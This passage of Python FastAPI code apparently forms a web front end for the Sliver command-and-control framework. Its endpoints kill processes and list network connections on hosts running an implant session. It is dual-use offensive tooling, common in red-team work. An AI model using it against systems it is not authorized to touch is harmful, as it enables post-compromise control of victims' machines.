    current_user: User = Depends(get_current_active_user)
):
    """Terminate a specific process by PID"""
    try:
        # Get client instance
        client = await get_client()
        
        # Get the session
        session = await client.interact_session(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
            
        # First try to get process info to verify it exists
        processes = await session.ps()
        process_exists = any(p.Pid == pid for p in processes)
        
        if not process_exists:
            raise HTTPException(status_code=404, detail="Process not found")
            
        # Terminate the process
        result = await session.terminate(pid)
        
        return JSONResponse(
            content={
                "status": "success",
                "message": f"Process {pid} terminated successfully",
                "result": str(result) if result else None
            }
        )
        
    except Exception as e:
        print(f"Error terminating process {pid}: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to terminate process: {str(e)}"
        )

@app.get("/network-connections")
async def list_network_connections(
    session_id: str = Query(..., description="Session ID to get network connections from"),
    tcp: bool = Query(True, description="Include TCP connections"),
    udp: bool = Query(True, description="Include UDP connections"),
    ipv4: bool = Query(True, description="Include IPv4 connections"),
    ipv6: bool = Query(True, description="Include IPv6 connections"),
    listening: bool = Query(True, description="Include listening connections"),
    current_user: User = Depends(get_current_active_user)
):
    """Get list of network connections from the session"""
    try:
        # Get client instance
        client = await get_client()
        
        # Get the session
        session = await client.interact_session(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
        
        # Get network connections from sliver session
        connections = await session.netstat(tcp=tcp, udp=udp, ipv4=ipv4, ipv6=ipv6, listening=listening)
        
        # Convert connections to a more frontend-friendly format
        connection_list = []
        for conn in connections.Entries:
            try:
                # Extract only the fields we need and ensure they're JSON serializable
                connection_info = {
                    "protocol": str(conn.Protocol) if hasattr(conn, 'Protocol') else None,
                    "local_address": {
                        "ip": str(conn.LocalAddr.Ip) if hasattr(conn, 'LocalAddr') and hasattr(conn.LocalAddr, 'Ip') else None,
                        "port": int(conn.LocalAddr.Port) if hasattr(conn, 'LocalAddr') and hasattr(conn.LocalAddr, 'Port') else None
                    },
                    "remote_address": {
                        "ip": str(conn.RemoteAddr.Ip) if hasattr(conn, 'RemoteAddr') and hasattr(conn.RemoteAddr, 'Ip') else None,
                        "port": int(conn.RemoteAddr.Port) if hasattr(conn, 'RemoteAddr') and hasattr(conn.RemoteAddr, 'Port') else None
                    },
                    "state": str(conn.SkState) if hasattr(conn, 'SkState') else None,
                    "process": {
                        "pid": int(conn.Process.Pid) if hasattr(conn, 'Process') and hasattr(conn.Process, 'Pid') else None,
                        "executable": str(conn.Process.Executable) if hasattr(conn, 'Process') and hasattr(conn.Process, 'Executable') else None
                    }
                }
                # Only add if we have at least a protocol and local address
                if connection_info["protocol"] is not None and connection_info["local_address"]["ip"] is not None:
                    connection_list.append(connection_info)
            except Exception as conn_err:
                print(f"Error processing connection entry: {conn_err}")
                continue
            
        return JSONResponse(
            content={
                "status": "success",
                "connections": connection_list
            }
        )
        
    except Exception as e:
        print(f"Error getting network connections: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"Failed to get network connections: {str(e)}"
        )
